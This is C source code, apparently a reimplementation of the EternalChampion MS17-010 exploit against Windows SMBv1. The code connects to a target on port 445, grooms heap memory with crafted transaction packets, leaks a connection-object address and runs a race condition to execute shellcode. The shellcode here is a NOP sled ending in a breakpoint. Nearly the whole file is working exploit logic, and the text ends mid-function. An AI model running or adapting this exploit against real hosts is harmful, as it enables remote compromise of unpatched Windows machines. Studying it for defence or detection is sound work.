#include "smb.h"

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "crypt32")

#define NO_INLINING

#ifdef NO_INLINING
#pragma auto_inline(off)
#endif

#pragma warning(push)
#pragma warning(disable : 6305 28182 6387 4244 6011)

PVOID GlobalTransactionInfoPointer = NULL;
HMODULE Globalsmblibmodule = NULL;
WORD* GlobalGroomMids = NULL, GlobalGroomCount = 0;



int wmain(int argc, wchar_t** argv)
{
	static STRING s;
	static UNICODE_STRING ipaddressarg;
	static HANDLE hthread;
	static DWORD dwtid, dwexitcode, i, attempts;
	ANYPOINTER p = { 0 };
	BUFFER tmp = { 0 };
	PTHREAD_START_ROUTINE exploit_method = &EternalChampionExec, check_vulnerable_method = NULL, backdoor_verify_method = NULL;


	if (GetUnsigned(&argc) >= 2)
	{
		bwsalloc(&tmp, MAKEUNSIGNED(wcslen(argv[1]) + sizeof(wchar_t)));
		cpy(tmp.pbdata, argv[1], wcslen(argv[1]) * sizeof(wchar_t));
		if (!find_memory_pattern(&tmp, &p, L".", sizeof(wchar_t)))
			InitUnicodeString(L"127.0.0.1", &ipaddressarg);
		else
			InitUnicodeString(argv[1], &ipaddressarg);
		bwsfree(&tmp);
		p = { 0 };
	}
	else
	{
		InitUnicodeString(L"127.0.0.1", &ipaddressarg);
	}

	ConvertUnicodeToString(&ipaddressarg, &s);
	FreeUnicodeString(&ipaddressarg);

	//check if the victim pc has been patched to the Eternal* exploits
	/*
	hthread = CreateThread(NULL, 0, check_vulnerable_method, s.Buffer, 0, &dwtid);

	if (isnull(hthread))
	{
		FreeString(&s);
		return STATUS_INVALID_HANDLE;
	}

	WaitForSingleObject(hthread, INFINITE);
	GetExitCodeThread(hthread, &dwexitcode);
	CloseHandle(hthread);
	PutUlongPtr(&hthread, 0), PutInt(&dwtid, 0);

	if (dwexitcode != NT_STATUS_SUCCESS)
	{
		dbgprint("[%S]: the target %S:%u appears to not be vulnerable to MS17-10...\n\n", __FUNCTION__, s.Buffer, 445U);
		FreeString(&s);
		return GetInt(&dwexitcode);
	}
	*/

	//use race condition to execute shellcode:
	hthread = CreateThread(NULL, 0, exploit_method, s.Buffer, 0, &dwtid);

	if (isnull(hthread))
	{
		FreeString(&s);
		return STATUS_INVALID_HANDLE;
	}

	WaitForSingleObject(hthread, INFINITE);
	GetExitCodeThread(hthread, &dwexitcode);
	CloseHandle(hthread);
	PutUlongPtr(&hthread, 0), PutInt(&dwtid, 0);

	if (dwexitcode != NT_STATUS_SUCCESS)
	{
		dbgprint("[%S]: the target %S:%u appears to not be vulnerable to MS17-10...\n\n", __FUNCTION__, s.Buffer, 445U);
		FreeString(&s);
		return GetInt(&dwexitcode);
	}


	FreeString(&s);
	return GetInt(&dwexitcode);
}


DWORD __stdcall EternalChampionExec(PVOID IN pvip_addr)
{
	BUFFER tmp = { 0 };
	PCSTR paramip = ((PCSTR)pvip_addr);
	UNICODE_STRING wip = { 0 };
	STRING ip = { 0 };
	
	static smb_info info;
	static RequestPacketLinkedList requests[0x200], * req;
	static ResponsePacketLinkedList responses[0x200], * resp, * firstnttransresp, * secondnttransresp;
	static ULONG_PTR seed;

	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x200, leakentrycount = 0x10, attempts = 3, groomcount = 0, numberofrespentries = 0x200, numberofleakentries = 0x0, leaktransoffset = 0;
	static DWORD firstleakfragtagoffset, secondleakfragtagoffset, secondleaklstrtagoffset;

	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 };
	ANYPOINTER* any = NULL, fragtag = { 0 }, leakedaddress = { 0 }, lstrtag = { 0 }, anyleakdata[2] = { 0 }, anyleaktrans = { 0 };
	ULONG_PTR datasentlastpacketoffset = 0, datarecievedlastpacketoffset = 0, firstleakaddresses[2] = { 0 }, secondleakaddresses[8] = { 0 }, connectionaddress = 0;
	WORD returnedids[8] = { 0 }, * returnedtreeid = returnedids, * returnedfid = returnedids + 1, * returnedmid = returnedids + 2, * returnedlogofftid = returnedids + 3, * special_pid = returnedids + 4, savedmids[4] = { 0 }, savedpids[4] = { 0 };
	BUFFER globalbuffers[2] = { 0 }, * globalsentdata = globalbuffers, * globalrecieveddata = globalbuffers + 1, * shellcode = NULL, * shellcodetmp = NULL;
	HANDLE heap = NULL;
	WIN7_64_TRANS_INFO transinfo = { 0 };
	X64_INFO archinfo = { 0 };
	pfnbwsallocateandcopy bwsallocateandcopy = NULL;
	pfnbwsdelete bwsdelete = NULL;
	pfnbwsnew bwsnew = NULL;
	TRANS_REQUEST_LIST* transactionrequestlist = NULL, * transreqentry = NULL;
	TRANS_RESPONSE_LIST* transactionresponselist = NULL, * transrespentry = NULL;
	

	Globalsmblibmodule = LoadLibraryW(TEXT("SmbLibrary"));

	if (!csprngcryptostartup())
		errmsg(__FUNCSIG__, __LINE__, GetLastError());

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);

	seed += random() % 0x1000;
	PutUlongPtr(&info.connection_handle, GetUlongPtr(&seed));
	any = NULL;

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	set_pid(&info, 4095);
	set_uid(&info, 0);
	set_mid(&info, 0);
	set_tid(&info, 0xFFFF);
	set_fid(&info, 0);
	set_special_pid(&info, GetUshort(special_pid));

	//setup Request single linked list
	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		j = (i + 1);
		req = &requests[i];
		if (i == (numberofreqentries - 1))
		{
			requests[i].NextEntry = (&requests[0]);
		}
		else
		{
			requests[i].NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup Response single linked list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		j = (i + 1);
		resp = responses + i;
		if (j == numberofrespentries)
			responses[i].NextEntry = &responses[0];
		else
			responses[i].NextEntry = &responses[j];
	}

	resp = responses;

	//get a handle to this processes heap
	heap = GetProcessHeap();

	if (isnull(info.TransactionContext = ((TRANSACTION_INFORMATION*)(HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(TRANSACTION_INFORMATION))))))
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_NO_MEMORY : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto done;
	}

	if (!AllocateAndSetupTransactionReqList(&transactionrequestlist, 0x80))
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto done;
	}

	if (!AllocateAndSetupTransactionRespList(&transactionresponselist, 0x80))
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto done;
	}

	//let the first entry be empty on both of my transaction req/resp circular doubly linked lists
	transreqentry = transactionrequestlist->Flink, transrespentry = transactionresponselist->Flink;

	info.currenttransreqentry = transreqentry, info.currenttransrespentry = transrespentry;
	info.transrequestlist = transactionrequestlist, info.transresponselist = transactionresponselist;
	GlobalTransactionInfoPointer = info.TransactionContext;

	if (isnull(Globalsmblibmodule))
	{
		dbgprint("[%S] failed to load library \"%ws\"\n", __FUNCTION__, TEXT("SmbLibrary.dll"));
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto done;
	}

	//we get the addresses of our dynamically imported functions 
	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(Globalsmblibmodule, "bwsallocateandcopy");
	bwsdelete = (pfnbwsdelete)GetProcAddress(Globalsmblibmodule, "bwsdelete");
	bwsnew = (pfnbwsnew)GetProcAddress(Globalsmblibmodule, "bwsnew");

	if (isnull(bwsallocateandcopy) || isnull(bwsdelete) || isnull(bwsnew))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto done;
	}

	shellcode = bwsnew(1), shellcodetmp = bwsnew(1);
	bwsalloc(shellcodetmp, 0x80 - 2);
	RtlFillMemory(shellcodetmp->pbdata, 0x80 - 2, 0x90);

	bwsallocateandcopy(shellcode, shellcodetmp->pbdata, shellcodetmp->dwsize);
	bwsfree(shellcodetmp);
	bwsallocateandcopy(shellcodetmp, "\xCC\xC3", 2);

	bwscat(shellcode, shellcodetmp);
	bwsfree(shellcodetmp);
	bwsdelete(&shellcodetmp);


	//we attempt to connect to the target on port 445\SMB
	*status = TargetConnect(*s, *sa, wsa, ip.Buffer, status[1]);

	if (*status != 0 || status[1] != 0)
	{
		PutInt(status, WSAGetLastError()), SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		goto done;
	}

	req = requests, resp = responses;

	//smb negotiate, session setup (with shellcode), and tree connect andx
	PutUshort(returnedtreeid, SmbTreeConnectAndx(requests, responses, &info, wip.Buffer, shellcode, globalsentdata, globalrecieveddata)), PutUlong(status, GetLastError());

	if (GetUlong(status) & STATUS_FAIL)
		goto logoff;

	while (notnull(req->NextEntry->ThisPacket.pbdata) && notnull(req->NextEntry->ThisSmb))
		req = req->NextEntry;
	while (notnull(resp->NextEntry->ThisPacket.pbdata) && notnull(resp->NextEntry->ThisSmb))
		resp = resp->NextEntry;

	PutUshort(returnedfid, SmbNtCreateAndx(requests, responses, &info, globalsentdata, globalrecieveddata)), PutUlong(status, GetLastError());

	if (GetUlong(status) & STATUS_FAIL)
		goto logoff;

	while (notnull(req->NextEntry->ThisPacket.pbdata) && notnull(req->NextEntry->ThisSmb))
		req = req->NextEntry;
	while (notnull(resp->NextEntry->ThisPacket.pbdata) && notnull(resp->NextEntry->ThisSmb))
		resp = resp->NextEntry;

	PutUshort(returnedmid, SmbTransactionGroomNtTransactionNtRenameLeak(requests, responses, &info, globalsentdata, globalrecieveddata)), PutUlong(status, GetLastError());

	if (GetUlong(status) & STATUS_FAIL)
		goto logoff;

recvalltransactions:
	while (notnull(transrespentry->smb))
		transrespentry = transrespentry->Flink;
	while (notnull(resp->ThisSmb))
		resp = resp->NextEntry;

	PutUlong(status, SmbRecvTransaction(resp, transrespentry, GetSocket(s), LOWORD(8204U)));
	PutUlong(status, ((GetUlong(status) == 0) ? GetLastError() : GetUlong(status)));

	/*
	while (notnull(transrespentry->smb))
		transrespentry = transrespentry->Flink;
	while (notnull(resp->ThisSmb))
		resp = resp->NextEntry;

	
	PutUlong(status, SmbRecvTransaction(responses, transrespentry, GetSocket(s), LOWORD(8204)));
	PutUlong(status, ((GetUlong(status) == 0) ? GetLastError() : GetUlong(status)));
	*/

	/*
	while ((transrespentry->smb->Command != SMB_COM_NT_TRANS) || (GetUshort(&transrespentry->smb->Mid) != LOWORD(8204)))
	{
		if (isnull(transrespentry->smb))
			goto logoff;
		transrespentry = transrespentry->Flink;
	}

	while ((resp->ThisSmb->Command != SMB_COM_NT_TRANS) || (GetUshort(&resp->ThisSmb->Mid) != LOWORD(8204)))
	{
		if (isnull(resp->ThisSmb) || isnull(resp->ThisPacket.pbdata))
			goto logoff;

		if (resp->NextEntry->ThisSmb->Command == SMB_COM_TRANS)
		{
			resp = resp->NextEntry;
			continue;
		}

		if (!find_memory_pattern(&resp->ThisPacket, &lstrtag, "LStr", 4))
		{
			resp = resp->NextEntry;
			continue;
		}
		resp = resp->NextEntry;
	}
	*/

	do
	{
		RtlZeroMemory(&tmp, sizeof(tmp));

		if (transrespentry->smb->Command == SMB_COM_NT_TRANS)
		{
			tmp.pbdata = (MAKEPBYTE(transrespentry->smb) + transrespentry->transaction.nttrans->DataOffset);
			tmp.dwsize = MAKEDWORD(transrespentry->transaction.nttrans->DataCount);
		
			if (isnull(tmp.pbdata))
			{
				PutUlong(status, STATUS_FAIL);
				errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
				goto logoff;
			}

			if (!find_memory_pattern(&tmp, &lstrtag, "LStr", 4))
			{
				transrespentry = transrespentry->Flink;
				continue;
			}
		}
		else if (transrespentry->smb->Command == SMB_COM_TRANS)
		{
			transrespentry = transrespentry->Flink;
			continue;
		}
		transrespentry = transrespentry->Flink;
	}
	while (notnull(transrespentry->smb));


	/*
	if (GetUshort(&resp->ThisSmb->Mid) != LOWORD(8204))
	{
		dbgprint("[%S] Unable to find leaked transaction response in responses on line %u...\n", __FUNCTION__, __LINE__);
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto logoff;
	}
	*/

	if (!find_memory_pattern(&tmp, &lstrtag, "LStr", 4))
	{
		dbgprint("[%S] Unable to find transaction structure in leaked data:\n", __FUNCTION__);
		//DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
		//dbgprint("\n");
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto recvalltransactions;//goto logoff;
	}

	leakedaddress.pbpointer = lstrtag.pbpointer, leakedaddress.pbpointer += (4 + 0x18);
	leakedaddress.address += 0x10, connectionaddress = GetUlongPtr(leakedaddress.paddress);

	PutUshort(returnedmid, SmbTransaction2Race(requests, responses, &info, GetUlonglong(&connectionaddress) + 0x3ca, globalsentdata, globalrecieveddata));
	PutUlong(status, GetLastError());

	for (i = 0; i < 0x40; i++)
	{
		PutUshort(returnedmid, SmbTransaction2Race(requests, responses, &info, GetUlonglong(&connectionaddress) + 0x3ca, globalsentdata, globalrecieveddata));
		PutUlong(status, GetLastError());

		if (GetUlong(status) == 0)
			_dbgprint("[%S] there's a race...\n", __FUNCTION__);
		else
			_dbgprint("[%S] race failed...\n", __FUNCTION__);
	}


logoff:

	while (notnull(req->ThisSmb) || notnull(req->ThisPacket.pbdata))
		req = req->NextEntry;
	while (notnull(resp->ThisSmb) || notnull(resp->ThisPacket.pbdata))
		resp = resp->NextEntry;

	PutUshort(returnedlogofftid, SmbDisconnectAndLogoff(requests, responses, &info, globalsentdata, globalrecieveddata));
	PutUlong(status, GetLastError());

	goto done;

done:

	if (validsock(*s))
		closesocket(*s);
	WSACleanup();

	_dbgprint("\n[%S] request buffers:\n", __FUNCTION__);
	DumpHex(globalsentdata->pbdata, globalsentdata->dwsize);

	_dbgprint("\n[%S] response buffers:\n", __FUNCTION__);
	DumpHex(globalrecieveddata->pbdata, globalrecieveddata->dwsize);

	if(GetUlonglong(&connectionaddress))
		_dbgprint("\n[%S] CONNECTION Address = 0x%llx\n", __FUNCTION__, connectionaddress);

	FreeRequestLinkedListBuffers(requests, &numberofreqentries);
	FreeResponseLinkedListBuffers(responses, &numberofrespentries);
	
	if (notnull(transactionrequestlist))
		FreeTransactionReqList(&transactionrequestlist), info.transrequestlist = NULL;
	if (notnull(transactionresponselist))
		FreeTransactionRespList(&transactionresponselist), info.transresponselist = NULL;

	bwsfree(globalsentdata);
	bwsfree(globalrecieveddata);
	bwsdelete(&shellcode);

	FreeString(&ip);
	FreeUnicodeString(&wip);
	HeapFree(heap, 0, info.TransactionContext), PutUlongPtr(&GlobalTransactionInfoPointer, NULL), PutUlongPtr(&info.TransactionContext, NULL);
	HeapFree(heap, 0, GlobalGroomMids);
	csprngcryptoshutdown();

	return GetUlong(status);
}




















//return new tree id if successfull and NULL upon failure
WORD __stdcall SmbTreeConnectAndx(RequestPacketLinkedList IN OUT* requestliststart, ResponsePacketLinkedList IN OUT* responseliststart, smb_info IN OUT* info, PCWSTR IN unicodeip, BUFFER IN* shellcode, BUFFER IN OUT* sentdata, BUFFER IN OUT* recieveddata) 
{
	RequestPacketLinkedList* req = requestliststart;
	ResponsePacketLinkedList* resp = responseliststart;
	unsigned status[2] = { 0 }, smbreqrespcount = 0;
	BOOLEAN bstatus = TRUE;
	SOCKET* s = ((SOCKET*)(info->socketpointer));

	if (
		isnull(requestliststart) ||
		isnull(responseliststart) ||
		isnull(info) ||
		isnull(unicodeip) ||
		isnull(sentdata) ||
		isnull(recieveddata)
		)
	{
		PutUlong(status, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return NULL;
	}

	set_mid(info, 0);
	set_pid(info, 4095);
	set_uid(info, 0);
	set_tid(info, 0xFFFF);

	bstatus = SendRecvNegotiate(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus || info->srv_last_error != 0)
	{
		errmsg(__FUNCSIG__, __LINE__, info->srv_last_error | STATUS_FAIL);
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		goto fail;
	}

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	//get next entries in list
	req = req->NextEntry;
	resp = resp->NextEntry;

	//send session_setup_andx and recv session setup response from server
	bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), info, shellcode);	//bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		dbgprint("[%S]: %S unexpectedly returned false...\n", __FUNCTION__, "SendRecvSessionSetupAndx()");
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		PutUlong(status, STATUS_FAIL);
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		dbgprint("[%S]: recieved unexpected error 0x%08X from server during %S command\n", __FUNCTION__, GetUnsigned(&resp->ThisSmb->Status.NtStatus), "SMB_COM_SESSION_SETUP_ANDX");
		errmsg(__FUNCSIG__, __LINE__, GetUlong(&resp->ThisSmb->Status.NtStatus));
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		goto fail;
	}


	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	//get next entries in list
	req = req->NextEntry;
	resp = resp->NextEntry;


	//send treeconnect_andx request and get response
	bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), info, unicodeip);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		dbgprint("[%S]: %S unexpectedly returned false...\n", __FUNCTION__, "SendRecvTreeConnectAndx()");
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		PutUlong(status, STATUS_FAIL);
		goto fail;
	}

	if (resp->ThisSmb->Status.NtStatus & STATUS_FAIL)
	{
		dbgprint("[%S]: recieved unexpected error code from server 0x%08X during %S command\n", __FUNCTION__, GetUnsigned(&resp->ThisSmb->Status.NtStatus), "SMB_COM_TREE_CONNECT_ANDX");
		errmsg(__FUNCSIG__, __LINE__, GetUnsigned(&resp->ThisSmb->Status.NtStatus));
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		goto fail;
	}

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	goto success;

success:
	SetLastError(0);
	return get_tid(info);
fail:
	SetLastError(GetUlong(status));
	return NULL;
}

//returns fid
WORD __stdcall SmbNtCreateAndx(RequestPacketLinkedList IN OUT* requestliststart, ResponsePacketLinkedList IN OUT* responseliststart, smb_info IN OUT* info, BUFFER IN OUT* sentdata, BUFFER IN OUT* recieveddata)
{
	RequestPacketLinkedList* req = requestliststart;
	ResponsePacketLinkedList* resp = responseliststart;
	unsigned status[2] = { 0 }, smbreqrespcount = 0;
	BOOLEAN bstatus = TRUE;
	SOCKET* s = ((SOCKET*)(info->socketpointer));
	PRESP_NT_CREATE_ANDX ntcreate = NULL;

	if (
		isnull(requestliststart) ||
		isnull(responseliststart) ||
		isnull(info) ||
		isnull(sentdata) ||
		isnull(recieveddata)
		)
	{
		PutUlong(status, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return NULL;
	}

	//go to the next blank entry in our request list
	if (notnull(req->ThisPacket.pbdata))
		while (notnull(req->ThisPacket.pbdata))
			req = req->NextEntry;
	//go to the next blank entry in our response list
	if (notnull(resp->ThisPacket.pbdata))
		while (notnull(resp->ThisPacket.pbdata))
			resp = resp->NextEntry;

	bstatus = SendRecvNtCreateAndx(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	ntcreate = ((PRESP_NT_CREATE_ANDX)(resp->ThisPacket.pbdata + SMB_PARAM_OFFSET));

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
	{
		PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (get_fid(info) == 0)
		set_fid(info, GetUshort(&ntcreate->Fid));

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	//get next entries in list
	req = req->NextEntry;
	resp = resp->NextEntry;

	goto success;

success:
	SetLastError(0);
	return get_fid(info);
fail:
	SetLastError(GetUlong(status));
	return NULL;
}

//returns mid of first sandwich packet smb
WORD __stdcall SmbTransactionGroomNtTransactionNtRenameLeak(RequestPacketLinkedList IN OUT* requestliststart, ResponsePacketLinkedList IN OUT* responseliststart, smb_info IN OUT* info, BUFFER IN OUT* sentdata, BUFFER IN OUT* recieveddata)
{
	RequestPacketLinkedList* req = requestliststart;
	ResponsePacketLinkedList* resp = responseliststart;
	unsigned status[2] = { 0 }, smbreqrespcount = 0, i = 0;
	BOOLEAN bstatus = TRUE;
	SOCKET* s = ((SOCKET*)(info->socketpointer));
	const unsigned groomcount = 10;
	const WORD mids[] = { 8105, 8107, 8111, 8115, 8125, 8141, 8158, 8172, 8175, 8188 }, pids[10] = { 4095 };
	PTRANS_REQUEST_LIST& transreqentry = ((PTRANS_REQUEST_LIST&)(info->currenttransreqentry));
	PTRANS_RESPONSE_LIST& transrespentry = ((PTRANS_RESPONSE_LIST&)(info->currenttransrespentry));
	SendRecvHandlerTypeOne SendRecvLeakTriggerPacketSandwich = &SendRecvNtTransSecondaryPacketSandwich;
	WORD lastmid = 0;

	if (
		isnull(requestliststart) ||
		isnull(responseliststart) ||
		isnull(info) ||
		isnull(sentdata) ||
		isnull(recieveddata)
		)
	{
		PutUlong(status, STATUS_INVALID_PARAMETER);
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return NULL;
	}

	//go to the next blank entry in our request list
	if (notnull(req->ThisPacket.pbdata))
		while (notnull(req->ThisPacket.pbdata))
			req = req->NextEntry;
	//go to the next blank entry in our response list
	if (notnull(resp->ThisPacket.pbdata))
		while (notnull(resp->ThisPacket.pbdata))
			resp = resp->NextEntry;

	for (i = 0; i < groomcount; ++i)
	{
		set_mid(info, GetUshort(mids + i));
		set_pid(info, GetUshort(pids + i));

		if (GetUshort(&lastmid) == 8188)
			break;

		//send our groom packets 
		bstatus = SendRecvTransGroomPacket(req, resp, GetSocket(s), info);
		++smbreqrespcount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		//extract any meaningfull info from request packet
		update_smb_info(info, &req->ThisPacket);
		//extract any meaningfull info from response packet
		update_smb_info(info, &resp->ThisPacket);

		if (!bstatus)
		{
			PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			goto fail;
		}

		if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
		{
			PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			goto fail;
		}

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
		{
			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			goto fail;
		}

		SyncTransactionInfo(info->TransactionContext, &req->ThisPacket);
		SyncTransactionInfo(info->TransactionContext, &resp->ThisPacket);

		FillInTransRequestEntry(transreqentry, req);
		FillInTransResponseEntry(transrespentry, resp);

		//append latest packet to global send data buffer
		bwscat(sentdata, &req->ThisPacket);
		//append latest recieved packet to global recieved data buffer
		bwscat(recieveddata, &resp->ThisPacket);

		PutUshort(&lastmid, get_mid(info));

		//get next entries in list
		req = req->NextEntry, resp = resp->NextEntry;
		transreqentry = transreqentry->Flink, transrespentry = transrespentry->Flink;
	}


	set_mid(info, 0x200c);
	set_pid(info, 4095);
	bstatus = SendRecvLeakTriggerPacketSandwich(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	//extract any meaningfull info from request packet
	update_smb_info(info, &req->ThisPacket);
	//extract any meaningfull info from response packet
	update_smb_info(info, &resp->ThisPacket);

	if (!bstatus)
	{
		PutUlong(status, ((GetLastError() == 0) ? STATUS_FAIL : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (isnull(resp->ThisPacket.pbdata) || (!(GetUlong(&resp->ThisPacket.dwsize) & 0xFFFFFFFF)))
	{
		PutUlong(status, ((GetLastError() == 0) ? NT_STATUS_INVALID_SMB : GetLastError()));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	if (GetUlong(&resp->ThisSmb->Status.NtStatus) & STATUS_FAIL)
	{
		PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		goto fail;
	}

	SyncTransactionInfo(info->TransactionContext, &req->ThisPacket);
	SyncTransactionInfo(info->TransactionContext, &resp->ThisPacket);

	FillInTransRequestEntry(transreqentry, req);
	FillInTransResponseEntry(transrespentry, resp);

	//append latest packet to global send data buffer
	bwscat(sentdata, &req->ThisPacket);
	//append latest recieved packet to global recieved data buffer
	bwscat(recieveddata, &resp->ThisPacket);

	//get next entries in lists
	//req = req->NextEntry, resp = resp->NextEntry, transreqentry = transreqentry->Flink, transrespentry = transrespentry->Flink;
	
	/*
	bstatus = SendRecvNtTransSecondaryPacketSandwich(req, resp, GetSocket(s), info);
	++smbreqrespcount;

	req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
